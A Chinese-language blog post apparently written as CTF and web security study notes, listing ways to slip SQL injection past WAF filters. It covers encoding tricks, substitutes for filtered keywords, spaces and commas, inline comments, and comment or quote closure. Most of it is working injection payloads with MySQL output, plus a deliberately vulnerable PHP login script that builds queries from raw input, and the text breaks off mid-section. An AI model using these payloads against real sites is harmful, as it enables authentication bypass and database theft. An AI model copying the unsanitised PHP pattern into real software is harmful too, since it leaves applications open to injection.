<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="AMao"><meta name="renderer" content="webkit"><meta name="copyright" content="AMao"><meta name="keywords" content="AMao's Blog"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>SQL注入过WAF思路 · AMao's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">AMao</div><div class="profile-signature">小菜鸡目前对一些东西的认知，希望师傅们可以帮忙纠正！</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">AMao's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">SQL注入过WAF思路</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2020-07-23</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" target="_blank" rel="noopener" date-tags="CTF"> CTF</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" target="_blank" rel="noopener" date-tags="Web安全"> Web安全</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">2.4k</span> | Reading time: <span class="post-count">11</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="SQL-注入绕-WAF-思路"><a href="#SQL-注入绕-WAF-思路" class="headerlink" title="SQL 注入绕 WAF 思路"></a>SQL 注入绕 WAF 思路</h1><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h3><ul>
<li><p>admin</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CHAR(97)+char(100)+char(109)+char(105)+char(110)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=(<span class="built_in">CHAR</span>(<span class="number">97</span>)+<span class="built_in">char</span>(<span class="number">100</span>)+<span class="built_in">char</span>(<span class="number">109</span>)+<span class="built_in">char</span>(<span class="number">105</span>)+<span class="built_in">char</span>(<span class="number">110</span>))</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Hex"><a href="#Hex" class="headerlink" title="Hex"></a>Hex</h3><blockquote>
<p>extractvalue() 对xml进行操作</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(0x3C613E61646D696E3C2F613E,0x2f61);</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| extractvalue(0x3C613E61646D696E3C2F613E,0x2f61) |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| admin                                           |</span><br><span class="line">+-------------------------------------------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; h=0x3C613E61646D696E3C2F613E</span><br><span class="line">&gt;&gt;&gt; print hex(h)[2:-1].decode(&quot;hex&quot;)</span><br><span class="line">&lt;a&gt;admin&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; h=0x2f61</span><br><span class="line">&gt;&gt;&gt; print hex(h)[2:].decode(&quot;hex&quot;)</span><br><span class="line">/a</span><br></pre></td></tr></table></figure>

<h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><h4 id="单引号"><a href="#单引号" class="headerlink" title="单引号"></a>单引号</h4><blockquote>
<p>%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0、%a7、%e0、%80、%a7</p>
</blockquote>
<h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><blockquote>
<p>%u0020、%uff00、%c0、%20、%c0、%a0 、%e0、%80、%a0</p>
</blockquote>
<h4 id="左括号"><a href="#左括号" class="headerlink" title="左括号"></a>左括号</h4><blockquote>
<p>%u0028 、%uff08、%c0、%28 、%c0、%a8、%e0、%80、%a8</p>
</blockquote>
<h4 id="右括号"><a href="#右括号" class="headerlink" title="右括号"></a>右括号</h4><blockquote>
<p>%u0029、%uff09、%c0、%29、%c0、%a9、%e0、%80、%a9</p>
</blockquote>
<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><ul>
<li><a href="https://www.jianshu.com/p/5da6f550aa7d" target="_blank" rel="noopener">参考</a></li>
</ul>
<blockquote>
<p>通常如果一样东西需要编码，说明这样东西并不适合传输。</p>
<p>对于URL来说，编码主要是为了避免引发歧义与混乱。</p>
<p>eg. </p>
<p>URL参数字符串中使用key=value键值对这样的形式来传参，键值对之间以&amp;符号分隔，如果value中包含&amp;或=，则会造成解析错误（还有 # ）</p>
</blockquote>
<ul>
<li><p>HTTP 请求过程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Browser    ---get/Post----&gt;  Server  </span><br><span class="line">		   &lt;----Response---</span><br></pre></td></tr></table></figure>

<ul>
<li><p>浏览器会把URL经过编码后发送给服务器，不同的浏览器对URL的编码规则不同。对于GET方式提交的数据，浏览器会自动进行URL编码；对于POST方式提交的数据，其编码方式可以由开发者进行指定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">	http://127.0.0.1/?id=1&apos;</span><br><span class="line"></span><br><span class="line">HTTP:</span><br><span class="line">GET /?id=1%27 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br></pre></td></tr></table></figure>
</li>
<li><p>服务器根据其自身的配置文件对URL进行解码（解码成Unicode），然后将显示内容编码</p>
<p>服务端除了服务器中间件会自动对URL进行解码，后端的Web程序会对前端进行编码的数据进行解码操作。</p>
<blockquote>
<p>在PHP中，$_GET数组中的value经过一次URL Decode （可翻阅官方文档）</p>
</blockquote>
</li>
</ul>
</li>
<li><p>正常解析过程</p>
<table>
<thead>
<tr>
<th align="center">用户输入</th>
<th align="center">PHP自身编码</th>
<th align="center">转义</th>
<th align="center">拼接到SQL语句</th>
</tr>
</thead>
<tbody><tr>
<td align="center">id=1%27</td>
<td align="center">$_GET[‘id’]=1’</td>
<td align="center"><code>id=1\&#39;</code></td>
<td align="center"><code>id=1\&#39;</code></td>
</tr>
</tbody></table>
<blockquote>
<p>语句闭合失败，无法注入</p>
</blockquote>
</li>
<li><p>PHP代码中使用了 urldecode() 等编码函数</p>
<table>
<thead>
<tr>
<th align="center">用户输入</th>
<th align="center">PHP自身编码</th>
<th align="center">转义</th>
<th align="center">urldecode()</th>
<th align="center">拼接到SQL语句</th>
</tr>
</thead>
<tbody><tr>
<td align="center">id=1%2527</td>
<td align="center">$_GET[‘id’]=1%27</td>
<td align="center">id=1%27</td>
<td align="center">id=1’</td>
<td align="center">id=1’</td>
</tr>
</tbody></table>
<blockquote>
<p>闭合成功，二次编码</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>TIPS：在注入过程中，#不能注入失败，%23注入成功，是因为 <code>#</code> 被浏览器识别成锚点，并不是URL编码绕过了WAF</p>
</blockquote>
<h2 id="order-by-过滤"><a href="#order-by-过滤" class="headerlink" title="order by 过滤"></a>order by 过滤</h2><blockquote>
<p>order by 超过范围(字段数)才报错</p>
</blockquote>
<ul>
<li><p>into  不相等就报错</p>
<ul>
<li>必须相等且结果为一行（必须用到limit）</li>
<li>select into 本是一个备份内容的操作</li>
<li>@是一个变量符号</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select password,username from tw_user limit 0,1 into @;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br><span class="line">mysql&gt; select password,username from tw_user limit 0,1 into @,@;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>可以直接爆破<br><code>union select 1,2,3</code> 直到不报错为止</li>
</ul>
<h2 id="Hex-绕过引号过滤"><a href="#Hex-绕过引号过滤" class="headerlink" title="Hex 绕过引号过滤"></a>Hex 绕过引号过滤</h2><blockquote>
<p>过滤了引号，导致字符串不能写入</p>
<p>使用16进制就不需要引号了</p>
<p>结合hex()、unhex()使用</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&quot;users&quot;</span><br><span class="line">select column_name from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure>

<h2 id="等号过滤"><a href="#等号过滤" class="headerlink" title="等号过滤"></a>等号过滤</h2><h3 id="使用like、in替换"><a href="#使用like、in替换" class="headerlink" title="使用like、in替换"></a>使用like、in替换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(password,1,1) in(&apos;p&apos;);</span><br><span class="line">substr(password,1,1) like(&apos;p&apos;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>in 还能通过 order by 指定顺序</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id IN (3,6,9,1,2,5,8,7) order by field(id,3,6,9,1,2,5,8,7);</span><br></pre></td></tr></table></figure>

<h3 id="lt-gt-替代等号构造真值"><a href="#lt-gt-替代等号构造真值" class="headerlink" title="&lt; &gt; 替代等号构造真值"></a><code>&lt; &gt;</code> 替代等号构造真值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">or swords &gt; sw</span><br><span class="line"></span><br><span class="line">or swords &lt; tw</span><br><span class="line"></span><br><span class="line">or 1&lt;3</span><br></pre></td></tr></table></figure>

<h3 id="REGEXP代替"><a href="#REGEXP代替" class="headerlink" title="REGEXP代替="></a>REGEXP代替=</h3><h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><h3 id="substr-逗号绕过"><a href="#substr-逗号绕过" class="headerlink" title="substr()逗号绕过"></a>substr()逗号绕过</h3><blockquote>
<p>from 1 for 1 替代 substr(,1,1)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from pass where id=1 union select 1,2, substr((select username from users limit 0,1),1,1);</span><br><span class="line"></span><br><span class="line">select * from pass where id=1 union select 1,2, substr((select username from users limit 0,1) from 1 for 1);</span><br></pre></td></tr></table></figure>

<h3 id="limit-逗号绕过"><a href="#limit-逗号绕过" class="headerlink" title="limit 逗号绕过"></a>limit 逗号绕过</h3><ul>
<li><p>limit 1 offset 0 代替limit 0,1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from pass where id=1 union select 1,2, substr((select username from users limit 1 offset 0),1,1);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>select top 1 from admin where .....</code>代替 limit 0,1</p>
</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><blockquote>
<p>join</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select password,username from user union select 1,2;</span><br><span class="line">+<span class="comment">----------------------------------+----------+</span></span><br><span class="line">| password                         | username |</span><br><span class="line">+<span class="comment">----------------------------------+----------+</span></span><br><span class="line">| 8085207a2cf59bf1b75e36f42bbc3c15 | admin    |</span><br><span class="line">| 1                                | 2        |</span><br><span class="line">+<span class="comment">----------------------------------+----------+</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select password,username from user union select * from (select 1)a join (select 2)b ;</span><br><span class="line">+<span class="comment">----------------------------------+----------+</span></span><br><span class="line">| password                         | username |</span><br><span class="line">+<span class="comment">----------------------------------+----------+</span></span><br><span class="line">| 8085207a2cf59bf1b75e36f42bbc3c15 | admin    |</span><br><span class="line">| 1                                | 2        |</span><br><span class="line">+<span class="comment">----------------------------------+----------+</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>using 可以替代 on</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from table1 inner join table2</span><br><span class="line">on table1.column1=table2.column2</span><br><span class="line">and table1.column2=table2.column2;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from table1 inner join table2 </span><br><span class="line">using(column1,column2);</span><br></pre></td></tr></table></figure>

<h2 id="绕过比较符号"><a href="#绕过比较符号" class="headerlink" title="绕过比较符号"></a>绕过比较符号</h2><h3 id="greatest"><a href="#greatest" class="headerlink" title="greatest()"></a>greatest()</h3><blockquote>
<p>返回最大值</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64;</span><br><span class="line"></span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64;</span><br><span class="line"># 这里的 = 也可以换成in()</span><br></pre></td></tr></table></figure>

<h3 id="between"><a href="#between" class="headerlink" title="between"></a>between</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `p_archives_3` WHERE `picsad` between 1113 and 1122;</span><br><span class="line"></span><br><span class="line">SELECT * FROM `p_archives_3` WHERE `picsad` &gt;= 1113 and `picsad`&lt;=1122;</span><br><span class="line"># 此处的 picsad 必须是数字类型</span><br></pre></td></tr></table></figure>

<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><h3 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h3><blockquote>
<p>括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。</p>
<p>而括号的两端，可以没有多余的空格</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select(user())from dual where(1=1)and(2=2)</span><br><span class="line">?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title="/**/"></a><code>/**/</code></h3><h3 id="1"><a href="#1" class="headerlink" title="/*1*/"></a><code>/*1*/</code></h3><h3 id="0d、-0a、-0c、-0b、-a0"><a href="#0d、-0a、-0c、-0b、-a0" class="headerlink" title="%0d、%0a、%0c、%0b、%a0"></a>%0d、%0a、%0c、%0b、%a0</h3><h3 id="-1"><a href="#-1" class="headerlink" title="+"></a>+</h3><h3 id="TAB"><a href="#TAB" class="headerlink" title="TAB"></a>TAB</h3><blockquote>
<p><code>\t</code></p>
</blockquote>
<h3 id="两个括号"><a href="#两个括号" class="headerlink" title="两个括号"></a>两个括号</h3><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><h3 id="1e0-和-1-0"><a href="#1e0-和-1-0" class="headerlink" title="1e0 和 1.0"></a>1e0 和 1.0</h3><blockquote>
<p>默认from后面必须是空格再加表名，为了过滤from可能正则表达式会检测后面的空格，可以用科学计数法绕过，因为1e0后面可以没有空格</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select A from B </span><br><span class="line">select A,1E0fromB</span><br></pre></td></tr></table></figure>

<ul>
<li>这里的逗号是两列的意思 1e0占了第二列</li>
<li>同样，1E0 可以用 1.0 代替</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select password,1e0from tw_user;</span><br><span class="line">+----------------------------------+-----+</span><br><span class="line">| password                         | 1e0 |</span><br><span class="line">+----------------------------------+-----+</span><br><span class="line">| 8085207a2cf59bf1b75e36f42bbc3c15 |   1 |</span><br><span class="line">+----------------------------------+-----+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select password,1.0from tw_user;</span><br><span class="line">+----------------------------------+-----+</span><br><span class="line">| password                         | 1.0 |</span><br><span class="line">+----------------------------------+-----+</span><br><span class="line">| 8085207a2cf59bf1b75e36f42bbc3c15 | 1.0 |</span><br><span class="line">+----------------------------------+-----+</span><br></pre></td></tr></table></figure>

<h2 id="N-绕过NULL"><a href="#N-绕过NULL" class="headerlink" title="\N 绕过NULL"></a>\N 绕过NULL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from pass where id=\Nunion select 1,2,3;</span><br></pre></td></tr></table></figure>

<h2 id="id-与-from-之间的空格绕过"><a href="#id-与-from-之间的空格绕过" class="headerlink" title="id 与 from 之间的空格绕过"></a>id 与 from 之间的空格绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select+uid-1+1.from tw_user where username = 'admin';</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">| +uid-1+1. |</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">|         1 |</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select-uid-1+6.from tw_user where username = 'admin';</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">| -uid-1+6. |</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">|         4 |</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line"><span class="comment"># -udi-1+6 结果为4，则 uid=1</span></span><br></pre></td></tr></table></figure>

<h2 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h2><blockquote>
<p><code>/*!*/</code>在其他数据库语言中是注释，但是在sql中却可以执行，为了sql提高语句的兼容性</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select password,username from tw_user /*!union*/ select 1,2;</span><br><span class="line">+----------------------------------+----------+</span><br><span class="line">| password                         | username |</span><br><span class="line">+----------------------------------+----------+</span><br><span class="line">| 8085207a2cf59bf1b75e36f42bbc3c15 | admin    |</span><br><span class="line">| 1                                | 2        |</span><br><span class="line">+----------------------------------+----------+</span><br><span class="line"></span><br><span class="line"># 在版本高于mysql5中可以执行</span><br></pre></td></tr></table></figure>

<h2 id="拆分字符串绕过"><a href="#拆分字符串绕过" class="headerlink" title="+ - . 拆分字符串绕过"></a><code>+ - .</code> 拆分字符串绕过</h2><p><code>?id=1’ or ‘11+11’=’11+11’</code></p>
<h2 id="宽字节注入绕过"><a href="#宽字节注入绕过" class="headerlink" title="宽字节注入绕过"></a>宽字节注入绕过</h2><h2 id="常见注释"><a href="#常见注释" class="headerlink" title="常见注释"></a>常见注释</h2><ul>
<li><code>-–+</code></li>
<li><code>#</code></li>
<li><code>%23</code></li>
<li><code>– -</code></li>
<li><code>%00</code></li>
<li>` 单行或者多行注释（别名）,反引号</li>
<li><code>/* */</code> 单行或者多行注释</li>
</ul>
<h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><h3 id="闭合SQL语句"><a href="#闭合SQL语句" class="headerlink" title="闭合SQL语句"></a>闭合SQL语句</h3><blockquote>
<p>可以使用常见的注释进行fuzz，要是都被过滤的话，可以通过闭合来绕过</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select uid from tw_user where username = 'aaaa';</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> uid <span class="keyword">from</span> tw_user <span class="keyword">where</span> username = <span class="string">'aaaa'</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span>;</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">| uid |</span><br><span class="line">+<span class="comment">-----+</span></span><br><span class="line">|   1 |</span><br><span class="line">+<span class="comment">-----+</span></span><br></pre></td></tr></table></figure>

<ul>
<li>payload：<code>aaaa&#39; or &#39;1&#39;=&#39;1</code></li>
</ul>
<h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h3><blockquote>
<p>可以用来过空格和正则，特殊情况下，还可以将其做注释符用(单行或多行注释)，实际上是mysql别名的用法</p>
</blockquote>
<ul>
<li><p><a href="http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/" target="_blank" rel="noopener">参考：雨神blog</a></p>
</li>
<li><p>demo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	$connect = mysql_connect(&apos;127.0.0.1&apos;, &apos;root&apos;, &apos;root&apos;) or die(&apos;数据库连接失败&apos;);</span><br><span class="line">	mysql_select_db(&apos;test&apos;);</span><br><span class="line">	mysql_query(&quot;set names &apos;utf8&apos;&quot;);</span><br><span class="line">	// $id = $_GET[&apos;id&apos;];</span><br><span class="line">	if(isset($_GET[&apos;name&apos;]) &amp;&amp; $_GET[&apos;pass&apos;])</span><br><span class="line">	&#123;</span><br><span class="line">		$username = $_GET[&apos;name&apos;];</span><br><span class="line">		$password = $_GET[&apos;pass&apos;];</span><br><span class="line">		$result = mysql_query(&quot;select * from user where username = &apos;$username&apos; and password = &apos;$password&apos;&quot;);</span><br><span class="line">	</span><br><span class="line">		if($result)</span><br><span class="line">		&#123;</span><br><span class="line">			$row = mysql_fetch_assoc($result);</span><br><span class="line">			print_r(&quot;&lt;h1&gt;Hello, $row[username]&lt;/h1&gt;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			print_r(&quot;Username or Password is error&quot;) ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		print_r(&quot;Something wrong happened!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>payload：?name=admin%23 可以通过验证</p>
<p>payload：?name=admin`  却没有注释成功</p>
</blockquote>
<blockquote>
<p>MySQL官方文档中并没有关于 ` 的注释用法，而是一个用户封装的标识符（一般用来引住表名、字段名、别名），还可以防止意外使用保留关键字</p>
<p>注释作用：MySQL query 执行sql语句的时候，在 ` 不闭合的情况下也能正常执行（原理不详）</p>
</blockquote>
<p>payload改进：</p>
